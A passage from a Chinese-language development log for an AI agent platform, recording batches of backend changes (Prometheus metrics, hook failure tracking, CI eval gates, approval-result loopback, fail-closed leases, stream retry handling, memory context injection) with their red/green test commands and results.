python -m py_compile app/tools/handlers/memory.py app/memory/t3_store.py app/memory/md_store.py \
  app/memory/lifecycle_store.py app/services/agent_tools.py app/services/capability_gate.py \
  app/tools/registry.py app/tools/catalog.py app/runtime/prompt_sections/memory.py app/services/skill_seeder.py
ruff check app/tools/handlers/memory.py app/memory/t3_store.py app/memory/md_store.py \
  app/memory/lifecycle_store.py app/services/agent_tools.py app/services/capability_gate.py \
  app/tools/registry.py app/tools/catalog.py app/runtime/prompt_sections/memory.py app/services/skill_seeder.py \
  tests/tools/test_memory_handler.py tests/services/test_tool_registry.py tests/tools/test_collector.py \
  tests/tools/test_bridge_equivalence.py tests/services/test_capability_gate_policy_surface.py
```

当前结果:红灯集合 6 passed;memory/tool/capability/prompt 相关回归组 91 passed,11 warnings;编译通过;ruff `All checks passed!`。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

### 12.21 2026-06-12 第二十一批:P1-11 Prometheus metrics endpoint

**范围**
- 新增零依赖 Prometheus text exporter,直接读取 `app.memory.metrics` 的现有 in-memory counters,不引入 `prometheus_client` 依赖。
- 新增无前缀 `/metrics` endpoint,与 `/api/admin/metrics/memory` JSON 面并存;该 endpoint 不挂到 `/api` / `/api/v1`,用于基础设施 scrape。
- 首批告警指标覆盖 durable memory extraction failure ratio:`hive_memory_extract_failure_ratio` 与 `hive_memory_extract_failure_ratio_high`。高失败率 gauge 使用最小样本数 5 与阈值 0.20,避免 1 次偶发失败直接触发。
- exporter 同步暴露 recall、sync、extract queue/replay、frozen prefix、autonomous LLM calls、LLM output-cap hit 等现有 counters;label value 做 Prometheus escaping,避免引号/反斜杠破坏 scrape 格式。

**代码证据**
- `backend/app/memory/metrics.py`:新增 `render_prometheus()`、Prometheus label escaping、extract failure ratio/high gauge 计算;原 `snapshot()` JSON 面保留。
- `backend/app/api/metrics.py`:新增 `/metrics` router,返回 `text/plain; version=0.0.4; charset=utf-8`。
- `backend/app/main.py`:将 `metrics_router` 挂到 webhooks/ws 同层的无前缀 router 区域,没有进入 `_api_routers` 双前缀循环。
- `backend/tests/memory/test_metrics.py`:新增 exporter 格式、failure ratio、高失败率 gauge、label escaping 测试。
- `backend/tests/api/test_prometheus_metrics.py`:新增 endpoint media type 与 `main.py` 无前缀注册断言。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/memory/test_metrics.py::TestPrometheusExport::test_prometheus_export_includes_extract_failure_ratio_and_alert \
  tests/memory/test_metrics.py::TestPrometheusExport::test_prometheus_export_escapes_label_values \
  tests/api/test_prometheus_metrics.py -q
```

初始结果:4 failed。失败点:
- `app.memory.metrics` 没有 `render_prometheus`。
- `app.api.metrics` 模块不存在。
- `main.py` 没有导入或注册 `metrics_router`。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/memory/test_metrics.py::TestPrometheusExport::test_prometheus_export_includes_extract_failure_ratio_and_alert \
  tests/memory/test_metrics.py::TestPrometheusExport::test_prometheus_export_escapes_label_values \
  tests/api/test_prometheus_metrics.py -q
pytest tests/memory/test_metrics.py tests/api/test_prometheus_metrics.py tests/api/test_admin_metrics.py -q
python -m py_compile app/memory/metrics.py app/api/metrics.py app/main.py
ruff check app/memory/metrics.py app/api/metrics.py app/main.py \
  tests/memory/test_metrics.py tests/api/test_prometheus_metrics.py
```

当前结果:红灯集合 4 passed;metrics/admin 相关回归组 41 passed;编译通过;ruff `All checks passed!`。

### 12.22 2026-06-12 第二十二批:P1-12 runtime hook failure observability

**范围**
- `RESPONSE_COMPLETE` / `POST_COMPACTION` 的 fire-and-forget hook 不再产生未观察的 async task exception;调度 helper 会给 task 加 done callback,异步失败也会进入 warning 与 metric。
- `PRE_COMPACTION` 的同步 hook 发射改走同一个 observed helper;失败保持非致命,但不再 debug 静默。
- `HookRegistry.emit()` 保持 handler 失败不中断 survivor handler 的语义,同时把 handler 异常计入 `hook_failure_total`。
- `memory.metrics` 新增 `hook_failure_total` JSON snapshot 与 `hive_memory_hook_failure_total` Prometheus counter,标签为 `event/source/reason`。

**代码证据**
- `backend/app/kernel/engine.py`:新增 `_schedule_runtime_hook()` / `_emit_runtime_hook()` / `_observe_runtime_hook_task()`;三条记忆/压缩 hook 热路径统一 warning + metric。
- `backend/app/runtime/hooks.py`:registry handler exception 计入 `record_hook_failure(event=<hook>, source="registry", reason=<ExceptionClass>)`。
- `backend/app/memory/metrics.py`:新增 `record_hook_failure()`、snapshot key、Prometheus counter,并纳入 `reset_all()`。
- `backend/tests/kernel/test_engine.py`:新增 fire-and-forget `RESPONSE_COMPLETE` 异步失败不影响 final answer 且记录 metric 的测试。
- `backend/tests/runtime/test_hooks.py`:原 “handler exception does not crash” 测试增加 registry failure metric 断言。
- `backend/tests/memory/test_metrics.py`:新增 snapshot + Prometheus hook failure 格式测试。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/memory/test_metrics.py::TestPrometheusExport::test_snapshot_and_prometheus_include_hook_failures \
  tests/runtime/test_hooks.py::TestHookRegistry::test_handler_exception_does_not_crash \
  tests/kernel/test_engine.py::test_response_complete_hook_failure_is_counted_without_failing_invocation -q
```

初始结果:3 failed。失败点:
- `app.memory.metrics` 没有 `record_hook_failure`。
- `snapshot()` 没有 `hook_failure_total`。
- fire-and-forget `RESPONSE_COMPLETE` 的异步异常显示为 `Task exception was never retrieved`,没有指标。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/memory/test_metrics.py::TestPrometheusExport::test_snapshot_and_prometheus_include_hook_failures \
  tests/runtime/test_hooks.py::TestHookRegistry::test_handler_exception_does_not_crash \
  tests/kernel/test_engine.py::test_response_complete_hook_failure_is_counted_without_failing_invocation -q
pytest tests/memory/test_metrics.py tests/api/test_prometheus_metrics.py \
  tests/runtime/test_hooks.py tests/kernel/test_engine.py -q
python -m py_compile app/memory/metrics.py app/runtime/hooks.py app/kernel/engine.py
ruff check app/memory/metrics.py app/runtime/hooks.py app/kernel/engine.py \
  tests/memory/test_metrics.py tests/runtime/test_hooks.py tests/kernel/test_engine.py
```

当前结果:红灯集合 3 passed,11 warnings;runtime hooks/kernel/metrics 相关回归组 108 passed,11 warnings;编译通过;ruff `All checks passed!`。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

### 12.23 2026-06-12 第二十三批:P1-13 CI/eval gate + behavior-level self-evolution bakeoff

**范围**
- 新增 `.github/workflows/harness-ci.yml`,PR/push 运行 backend harness gates:ruff、pytest eval/prompt suites、`python -m app.runtime.prompt_eval`、`python -m app.evals.run --suite core_v1 --target hive --mode internal`、`python -m app.evals.self_evolution_bakeoff`。
- `self_evolution_bakeoff` 的 Hive 侧从 `deterministic_checks(path contains string)` 改为 `local_behavior_scenarios`:每个场景在临时 agent workspace 执行真实服务函数并按行为断言计分。
- 行为场景覆盖 next-turn session learning projection、repeated workflow → skill candidate、loaded skill failure → patch route + eval ledger、skill lifecycle promote/patch、long-task artifact resume、manifest/preflight/skill guard safety。
- `docs/self-evolution-bakeoff-report.json` 已重生成,数据集字段为 `behavior_assertions`,Hive source 为 `local_behavior_scenarios`,不再含 `contains` 型证据。
- CI 中 Hermes 对照使用显式 baseline fixture;外部 Hermes live CLI/repo evidence 仍由既有 `core_v1` bakeoff runtime 跑,本批不再把旧字符串分数伪装成行为证据。

**代码证据**
- `.github/workflows/harness-ci.yml`:新增 Harness CI workflow。
- `backend/app/evals/self_evolution_bakeoff.py`:新增行为 runner;Hive report 输出 `source=local_behavior_scenarios` / `behavior_complete=true`;场景 evidence 为 `{id, passed, detail}`。
- `backend/tests/evals/test_self_evolution_bakeoff.py`:断言 dataset 使用 `behavior_assertions`,不再使用 `deterministic_checks`;断言 Hive evidence 不含 `contains`。
- `backend/tests/evals/test_harness_ci_workflow.py`:断言 CI workflow 同时包含 pytest、prompt_eval、internal eval、self-evolution bakeoff。
- `docs/self-evolution-bakeoff-report.json`:重生成后的报告显示 `local_behavior_scenarios` 与行为断言。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/evals/test_self_evolution_bakeoff.py tests/evals/test_harness_ci_workflow.py -q
```

初始结果:3 failed。失败点:
- dataset 缺 `behavior_assertions`,仍是 `deterministic_checks`。
- Hive report source 仍是 `local_repo_deterministic_checks`。
- `.github/workflows/harness-ci.yml` 不存在。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/evals/test_self_evolution_bakeoff.py tests/evals/test_harness_ci_workflow.py -q
pytest tests/evals tests/runtime/test_prompt_eval.py tests/services/test_prompt_contracts.py -q
python -m app.runtime.prompt_eval --fail-severity=critical,high
python -m app.evals.run --suite core_v1 --target hive --mode internal
python -m app.evals.self_evolution_bakeoff \
  --hermes-scores-json '{"next_turn_adaptation":85,"repeated_workflow_learning":84,"tool_failure_lesson_reuse":80,"skill_candidate_creation":78,"long_task_resume":70,"safety_tenant_policy":60}'
python -m app.evals.self_evolution_bakeoff \
  --hermes-scores-json '{"next_turn_adaptation":85,"repeated_workflow_learning":84,"tool_failure_lesson_reuse":80,"skill_candidate_creation":78,"long_task_resume":70,"safety_tenant_policy":60}' \
  --output ../docs/self-evolution-bakeoff-report.json
python -m py_compile app/evals/self_evolution_bakeoff.py app/evals/run.py app/runtime/prompt_eval.py
ruff check app/evals/self_evolution_bakeoff.py app/evals/run.py app/runtime/prompt_eval.py \
  tests/evals/test_self_evolution_bakeoff.py tests/evals/test_harness_ci_workflow.py
```

当前结果:红灯集合 4 passed;eval/prompt 相关回归组 46 passed,11 warnings;prompt contract gate passed;internal eval `average_score=100.0 pass_rate=100.0`;self-evolution bakeoff `passed=true`;编译通过;ruff `All checks passed!`。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

### 12.24 2026-06-12 第二十四批:P1-14 HITL approval result loopback

**范围**
- governance approval request details 新增 `session_id` 与 `origin`,从 `ToolExecutionContext.session_id` 贯通到 `ApprovalRequest.details`。
- `ApprovalService.resolve_approval()` 在 approved 后仍通过 `execute_approved_tool()` 执行动作,但执行结果不再只写通知;会调用 `_publish_approval_result_to_origin()` 回流到原会话。
- 回流写两层:① `ChatMessage(role="tool_call", conversation_id=<session_id>)` 存储结构化 `approval_tool_result`;② 如果存在同 session 的 active `web_chat_turn` RuntimeTask,追加 synthetic pending message 到 `metadata_json.pending_user_messages`,由既有 mid-run drain 注入 kernel。
- 没有 `session_id` 的老 approval request 保持兼容,只走旧通知路径。

**代码证据**
- `backend/app/tools/governance.py`:新增 `ToolGovernanceContext.session_id`;approval path 只在 session_id 存在时透传给 deps,避免破坏旧测试桩。
- `backend/app/tools/governance_resolver.py`:从 runtime context 写入 governance context,并把 `session_id/origin` 放入 approval details。
- `backend/app/services/approval_service.py`:新增 `_publish_approval_result_to_origin()`;approved execution 后写 ChatMessage 并更新 active run pending queue。
- `backend/tests/tools/test_governance_resolver.py`:断言 approval details 包含 `session_id`。
- `backend/tests/services/test_approval_service.py`:断言批准结果写入 `ChatMessage(role=tool_call)` 与 active run `pending_user_messages`。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/tools/test_governance_resolver.py::test_tool_governance_resolver_dependencies_wrap_services \
  tests/services/test_approval_service.py::test_approval_result_is_published_to_origin_session_and_active_run -q
```

初始结果:2 failed。失败点:
- `_request_approval()` 不接受 `session_id`。
- `ApprovalService` 没有 `_publish_approval_result_to_origin()`。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/tools/test_governance_resolver.py::test_tool_governance_resolver_dependencies_wrap_services \
  tests/services/test_approval_service.py::test_approval_result_is_published_to_origin_session_and_active_run -q
pytest tests/services/test_approval_service.py tests/tools/test_governance_resolver.py \
  tests/tools/test_governance.py tests/tools/test_service.py tests/tools/test_plan_mode_tool_gate.py -q
python -m py_compile app/services/approval_service.py app/tools/governance.py app/tools/governance_resolver.py
ruff check app/services/approval_service.py app/tools/governance.py app/tools/governance_resolver.py \
  tests/services/test_approval_service.py tests/tools/test_governance_resolver.py
```

当前结果:红灯集合 2 passed,10 warnings;governance/tool-service/approval 相关回归组 66 passed,11 warnings;编译通过;ruff `All checks passed!`。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

### 12.25 2026-06-12 第二十五批:P1-15 multi-instance lease fail-closed + web-chat active-run uniqueness

**范围**
- trigger fire Redis lease 异常从 fail-open 改为 fail-closed;Redis 不可用时不再启动不可重复 trigger invocation。
- heartbeat distributed lease 异常从“回退本地内存锁”改为 fail-closed;多实例场景不再因 Redis 故障双跑 heartbeat。
- web chat active run 互斥从应用层“先查再插”补成数据库级 partial unique index:`uq_runtime_tasks_active_web_chat_session`。
- web chat 并发插入触发唯一冲突时不丢输入:事务 rollback 后重新读取 winning active run,把用户输入写入 durable `ChatMessage` 与 `RuntimeTask.metadata_json.pending_user_messages`,沿用 P1-2 mid-run drain。
- 迁移先清理历史重复 active web-chat run:同一 `(parent_agent_id,parent_session_id)` 只保留最新 active run,其余标 `failed` 并写 `metadata_json.superseded_by_active_run_guard=true`,避免创建唯一索引时卡死。

**代码证据**
- `backend/app/services/trigger_daemon.py`:`_acquire_trigger_fire_lease()` 捕获 Redis/lease 异常后返回 `False`,不再 `return True` 放行。
- `backend/app/services/heartbeat.py`:`_try_acquire_heartbeat_lease_async()` Redis lease 异常后返回 `False`,不再退回 `_try_acquire_heartbeat_lease()` 本地锁。
- `backend/app/models/runtime_task.py`:模型侧声明 `uq_runtime_tasks_active_web_chat_session` partial unique index,与迁移索引名一致。
- `backend/alembic/versions/web_chat_active_run_unique_0612.py`:历史重复 active-run 清理 + partial unique index;revision chain 从 `token_usage_events_0612` 接出,`alembic heads` 为单 head。
- `backend/app/services/web_chat_runtime.py`:捕获 `_ACTIVE_WEB_CHAT_UNIQUE_INDEX_NAME` 对应 `IntegrityError`,rollback 后转入 durable queued-message path,并广播 `user_message_queued`。
- `backend/tests/services/test_trigger_daemon.py`:新增 Redis lease 异常 fail-closed 红测;既有非租约语义测试显式 stub lease acquired。
- `backend/tests/services/test_heartbeat.py`:新增 Redis lease 异常 fail-closed 红测;既有 heartbeat 执行语义测试显式 stub lease acquired。
- `backend/tests/services/test_web_chat_runtime.py`:新增唯一索引冲突后排队到 active run 的红测。
- `backend/tests/migrations/test_web_chat_active_run_unique_migration.py`:覆盖 revision chain、历史重复清理 SQL、partial unique index SQL、downgrade drop index。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/services/test_trigger_daemon.py::test_trigger_fire_lease_failure_fails_closed \
  tests/services/test_heartbeat.py::test_heartbeat_distributed_lease_failure_fails_closed -q
pytest tests/services/test_web_chat_runtime.py::test_start_web_chat_run_queues_when_active_run_unique_index_conflicts \
  tests/migrations/test_web_chat_active_run_unique_migration.py -q
```

初始结果:第一组 2 failed,旧 trigger lease 异常返回 True、heartbeat lease 异常退回本地锁;第二组 4 failed,旧 web chat 直接抛 `IntegrityError`,且 `web_chat_active_run_unique_0612.py` 不存在。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/services/test_trigger_daemon.py::test_trigger_fire_lease_failure_fails_closed \
  tests/services/test_heartbeat.py::test_heartbeat_distributed_lease_failure_fails_closed -q
pytest tests/services/test_web_chat_runtime.py::test_start_web_chat_run_queues_when_active_run_unique_index_conflicts \
  tests/migrations/test_web_chat_active_run_unique_migration.py -q
pytest tests/services/test_trigger_daemon.py tests/services/test_heartbeat.py \
  tests/services/test_web_chat_runtime.py tests/migrations/test_web_chat_active_run_unique_migration.py -q
python -m py_compile app/services/trigger_daemon.py app/services/heartbeat.py \
  app/services/web_chat_runtime.py app/models/runtime_task.py \
  alembic/versions/web_chat_active_run_unique_0612.py
alembic heads
ruff check app/services/trigger_daemon.py app/services/heartbeat.py \
  app/services/web_chat_runtime.py app/models/runtime_task.py \
  alembic/versions/web_chat_active_run_unique_0612.py \
  tests/services/test_trigger_daemon.py tests/services/test_heartbeat.py \
  tests/services/test_web_chat_runtime.py tests/migrations/test_web_chat_active_run_unique_migration.py
```

当前结果:fail-closed 红灯集合 2 passed;web-chat uniqueness/migration 红灯集合 4 passed;P1-15 回归组 75 passed,10 warnings;编译通过;`alembic heads` 输出单 head `web_chat_active_run_unique_0612`;ruff `All checks passed!`。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

### 12.26 2026-06-12 第二十六批:OpenAI-compatible stream retry tombstone

**范围**
- OpenAI-compatible streaming 在已经吐出 partial chunk 后遇到 `ReadError/ConnectError/ConnectTimeout` 并重试时,不再保留上一轮 partial 聚合内容。
- retry 前如果已有 partial 内容、reasoning、tool_call 或 finish/usage,会清空本轮聚合状态并向底层 `on_chunk` 发 `STREAM_RETRY_TOMBSTONE`。
- kernel 截获 tombstone 后清空自身 `streamed_chunks`,不把 tombstone 写入最终 answer;同时通过 `on_event({"type":"stream_retry_tombstone"})` 让 runtime 层发 reset。
- web chat runtime 把 `stream_retry_tombstone` 转成结构化 `chunk(reset=true)` 事件;前端收到 reset chunk 后清空当前 streaming assistant 内容,随后追加重试后的新 chunk。最终 `done` 仍以 provider 成功重试后的 `LLMResponse.content` 为准。

**代码证据**
- `backend/app/services/llm_client.py`:新增 `STREAM_RETRY_TOMBSTONE`;OpenAI-compatible streaming 的 retry path 调用 `reset_partial_stream_for_retry()` 清空聚合并发 tombstone。
- `backend/app/services/llm_utils.py`:re-export tombstone 常量,保证 kernel/runtime 使用同一符号。
- `backend/app/kernel/engine.py`:`_emit_chunk()` 截获 tombstone,清空 `streamed_chunks`,发 `stream_retry_tombstone` runtime event,不把 tombstone 传给普通 `on_chunk`。
- `backend/app/services/chat_message_parts.py`: `build_chunk_event(..., reset=True)` 输出 `{"type":"chunk","reset":true,"part":{"type":"stream_reset"}}`。
- `backend/app/services/web_chat_runtime.py`: `stream_to_ws()` 和 `runtime_event_to_ws()` 均识别 tombstone/reset,并清空本地 `streamed_chunks`。
- `frontend/src/pages/agent-detail/chatRuntime.ts`:新增 `applyStreamingChunkEvent()`;`reset=true` 时清空当前 streaming assistant 内容。
- `frontend/src/pages/AgentDetail.tsx`:chunk 分支复用 `applyStreamingChunkEvent()`。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/services/test_llm_client_streaming.py::test_openai_compatible_streaming_retry_tombstones_partial_content \
  tests/services/test_chat_message_parts.py::test_stream_event_builders_include_structured_parts -q

cd /Users/example-owner/vc-saas/hiveclaw-main/frontend
npm run test -- src/pages/agent-detail/chatRuntime.test.ts
```

初始结果:后端 import 失败,`STREAM_RETRY_TOMBSTONE` 不存在;前端 1 failed,`applyStreamingChunkEvent` 不存在。旧实现会把第一次 `partial ` 与重试后的 `partial answer` 拼成重复内容,且没有 reset 事件。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/services/test_llm_client_streaming.py tests/services/test_chat_message_parts.py \
  tests/kernel/test_engine.py::test_kernel_converts_stream_retry_tombstone_to_runtime_event \
  tests/kernel/test_engine.py::test_kernel_continues_streaming_output_after_output_cap -q
python -m py_compile app/services/llm_client.py app/services/llm_utils.py \
  app/services/chat_message_parts.py app/kernel/engine.py app/services/web_chat_runtime.py
ruff check app/services/llm_client.py app/services/llm_utils.py app/services/chat_message_parts.py \
  app/kernel/engine.py app/services/web_chat_runtime.py \
  tests/services/test_llm_client_streaming.py tests/services/test_chat_message_parts.py tests/kernel/test_engine.py

cd /Users/example-owner/vc-saas/hiveclaw-main/frontend
npm run test -- src/pages/agent-detail/chatRuntime.test.ts
npm run build
```

当前结果:后端相关回归 14 passed,10 warnings;编译通过;ruff `All checks passed!`;前端 `chatRuntime.test.ts` 14 passed;`npm run build` 通过。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

### 12.27 2026-06-12 第二十七批:round aggregate tool-result spill

**范围**
- 单条 tool result 仍按原规则处理:非 exempt 且大于 50KB 时写 `workspace/tool_results/<tool_call_id>.txt` 并内联 4KB preview;exempt 工具在普通单条路径保持不驱逐。
- round aggregate budget 触发时不再只机械截断,也不再让 exempt 工具绕过 200K round 预算;会以 `force=True, reason="round aggregate budget"` 重新进入 eviction helper。
- 强制路径会把完整结果写到 eviction_dir,并返回带 `read_file("workspace/tool_results/...")` 的可恢复指针;没有 eviction_dir 的非 agent/test path 仍保留带 reason 的可观测截断说明。
- 并行工具批与串行工具批都改为先检查 `_round_tool_chars + len(_content)` 是否超预算,强制 spill 后再累计 round budget,避免用 spill 前长度误判后续工具。

**代码证据**
- `backend/app/kernel/engine.py`:`_maybe_evict_tool_result()` 新增 `force` 与 `reason`;exempt 只在 `force=False` 时生效;file reference 中写明 eviction reason。
- `backend/app/kernel/engine.py`:并行与串行 tool result append 路径的 aggregate overflow 分支都调用 `force=True`,消除两条路径的行为分叉。
- `backend/tests/kernel/test_engine.py`:新增 `test_force_evict_writes_exempt_tool_result_for_round_aggregate_overflow`,覆盖 `read_file` 这类 exempt 工具在强制 aggregate path 下也会写完整文件。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/kernel/test_engine.py::test_force_evict_writes_exempt_tool_result_for_round_aggregate_overflow -q
```

初始结果:1 failed。失败点:`_maybe_evict_tool_result()` 不接受 `force` 参数,旧实现无法表达 aggregate overflow 的强制 spill。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/kernel/test_engine.py::test_force_evict_writes_exempt_tool_result_for_round_aggregate_overflow \
  tests/kernel/test_engine.py::test_maybe_evict_tool_result_truncates_large_output \
  tests/kernel/test_engine.py::test_maybe_evict_writes_file_when_eviction_dir_provided \
  tests/kernel/test_engine.py::test_large_tool_result_evicted_in_kernel_loop -q
python -m py_compile app/kernel/engine.py
ruff check app/kernel/engine.py tests/kernel/test_engine.py
```

当前结果:eviction 相关回归 4 passed,11 warnings;编译通过;ruff `All checks passed!`。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

### 12.28 2026-06-12 第二十八批:prompt cache hit-rate metrics

**范围**
- `extract_cache_metrics()` 不再是定义后零消费;kernel 每次拿到 `response.usage` 后按 active provider 提取 cache read/write/input token 指标。
- 新增 provider-scoped prompt cache counters:observation hit/miss、read tokens、write tokens、input tokens、uncached input tokens、hit-rate gauge。
- 指标进入既有 `snapshot()` 与无前缀 `/metrics` Prometheus exporter,与 P1-11 的 metrics 面统一。

**代码证据**
- `backend/app/kernel/engine.py`:LLM generation 成功后调用 `extract_cache_metrics(response.usage, provider=...)` 与 `record_prompt_cache_metrics()`。
- `backend/app/memory/metrics.py`:新增 `_prompt_cache_*` counters、`record_prompt_cache_metrics()`、snapshot keys 与 `hive_prompt_cache_*` Prometheus metrics。
- `backend/tests/memory/test_metrics.py`:覆盖 snapshot 与 Prometheus text export。
- `backend/tests/kernel/test_engine.py`:覆盖 kernel 从 response usage 写入 prompt cache metrics。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/memory/test_metrics.py::test_prompt_cache_metrics_snapshot_and_prometheus_export \
  tests/kernel/test_engine.py::test_kernel_records_prompt_cache_metrics_from_response_usage -q
```

初始结果:collection error。失败点:`record_prompt_cache_metrics` 不存在,旧 metrics exporter 没有 prompt cache 指标落点。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main/backend
source .venv/bin/activate
pytest tests/memory/test_metrics.py tests/api/test_prometheus_metrics.py \
  tests/services/test_prompt_cache.py \
  tests/kernel/test_engine.py::test_kernel_records_prompt_cache_metrics_from_response_usage -q
python -m py_compile app/memory/metrics.py app/kernel/engine.py app/services/prompt_cache.py
ruff check app/memory/metrics.py app/kernel/engine.py app/services/prompt_cache.py \
  tests/memory/test_metrics.py tests/kernel/test_engine.py tests/services/test_prompt_cache.py
```

当前结果:metrics/prompt-cache/kernel 回归 63 passed,10 warnings;编译通过;ruff `All checks passed!`。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

### 12.29 2026-06-12 第二十九批:memory/runtime/knowledge 三路单注入

**范围**
- 修掉「记忆双检索双注入」:每轮 memory resolver 只走一次 `build_memory_context(query=<latest user query>)`;无 query 时保持 snapshot 语义,但不再额外跑 `build_memory_snapshot()`。
- canonical memory fence 统一为 `<context_block kind="memory_context" source="memory_provider:context">`;旧 `memory_provider:snapshot` / `memory_provider:recall` 路径从 runtime invoker 与测试锚点移除。
- `agent_runtime_context` 从 retrieval resolver 拆出为独立 `_resolve_runtime_metadata_context()` 与 kernel dependency,进入 dynamic suffix 的 `runtime_metadata_context`,不再混进 `## Knowledge`。
- `_resolve_retrieval_context()` 只返回 external knowledge(`knowledge_provider:relevant`),因此 `## Knowledge` 恢复为外部证据区,不承载 memory/runtime hints。

**代码证据**
- `backend/app/runtime/invoker.py`:`_resolve_memory_context()` 改为单次 query-scoped `build_memory_context`;新增 `_resolve_runtime_metadata_context()`;`_resolve_retrieval_context()` 删除 memory/runtime 拼接。
- `backend/app/kernel/engine.py`:新增可选 `resolve_runtime_metadata_context`;主路径、prefix cache hit、PTL round-drop/full-compress、prefix refresh 路径全部传入 `runtime_metadata_context`。
- `backend/app/runtime/prompt_builder.py` 与 `backend/app/runtime/prompt_sections/__init__.py`:动态后缀说明更新为 Memory / Runtime Metadata / Knowledge 三路分层。
- `backend/tests/runtime/test_memory_query_routing.py`:覆盖单次 query-scoped memory retrieval、runtime metadata 独立 resolver、retrieval-only knowledge。
- `backend/tests/kernel/test_prompt_cache_integration.py`:覆盖 kernel 将 Runtime Metadata 放在 `## Knowledge` 之前,且不混入 Knowledge。
- `backend/tests/runtime/test_context_engine.py`、`backend/tests/architecture/test_context_memory_boundaries.py`、`backend/tests/architecture/test_h3_context_engine_contract.py`:路径守卫改为 `memory_provider:context`。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
pytest backend/tests/runtime/test_memory_query_routing.py \
  backend/tests/kernel/test_prompt_cache_integration.py::test_kernel_routes_runtime_metadata_outside_knowledge_section -q
```

初始结果:4 failed。失败点分别为:`_resolve_memory_context()` 仍调用 `build_memory_snapshot()`;`_resolve_runtime_metadata_context()` 不存在;`_resolve_retrieval_context()` 仍调用 `build_agent_runtime_context()`;`KernelDependencies` 不接受 `resolve_runtime_metadata_context`。

Green 阶段通过摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
pytest backend/tests/runtime/test_memory_query_routing.py backend/tests/runtime/test_invoker.py \
  backend/tests/runtime/test_standalone_prompt.py backend/tests/runtime/test_context_engine.py \
  backend/tests/architecture/test_context_memory_boundaries.py \
  backend/tests/architecture/test_h3_context_engine_contract.py \
  backend/tests/kernel/test_prompt_cache_integration.py -q
python -m py_compile backend/app/runtime/invoker.py backend/app/kernel/engine.py \
  backend/app/runtime/prompt_builder.py backend/app/runtime/prompt_sections/__init__.py
ruff check backend/app/runtime/invoker.py backend/app/kernel/engine.py \
  backend/app/runtime/prompt_builder.py backend/app/runtime/prompt_sections/__init__.py \
  backend/tests/runtime/test_memory_query_routing.py backend/tests/runtime/test_invoker.py \
  backend/tests/runtime/test_standalone_prompt.py backend/tests/runtime/test_context_engine.py \
  backend/tests/architecture/test_context_memory_boundaries.py \
  backend/tests/architecture/test_h3_context_engine_contract.py \
  backend/tests/kernel/test_prompt_cache_integration.py
```

当前结果:相关 runtime/kernel/architecture 回归 69 passed,11 warnings;编译通过;ruff `All checks passed!`。warnings 来自第三方 `lark_oapi` / `websockets` deprecation,与本次改动无关。

### 12.30 2026-06-12 第三十批:MemoryAssembler 分数裁剪不再被二层 ratio 截断覆盖

**范围**
- 保留 `MemoryAssembler` 的 score-aware selection 作为 memory context 的唯一排序/裁剪权威。
- `prompt_builder.build_dynamic_prompt_suffix()` 不再把 memory context 二次压到 `memory_budget_chars * 0.6`;它现在使用完整 `memory_budget_chars` 作为同等 hard cap,只防 rogue caller,不覆盖 assembler 已完成的排名。
- trim marker 文案从 `memory snapshot trimmed` 更新为 `memory context trimmed`,避免 runtime 已改成 query-scoped context 后继续传播 snapshot-only 术语。

**代码证据**
- `backend/app/runtime/prompt_builder.py`:删除 `_MEMORY_SNAPSHOT_BUDGET_RATIO`;memory section cap 改为 `max(int(memory_budget_chars),1500)`;注释明确 assembler 已做 score-aware trimming。
- `backend/app/runtime/prompt_sections/memory.py`:trim marker 改为 `memory context trimmed...use search_memory...`。
- `backend/tests/runtime/test_prompt_builder.py`:新增 `test_memory_context_within_memory_budget_is_not_second_trimmed_to_ratio`,覆盖预算内尾部证据不被 60% ratio 砍掉;原 oversized 测试改为 full memory budget cap。
- `backend/tests/runtime/test_memory_section.py`:trim signpost 测试改名为 memory context。

**回归测试**

Red 阶段失败摘要:

```bash
cd /Users/example-owner/vc-saas/hiveclaw-main
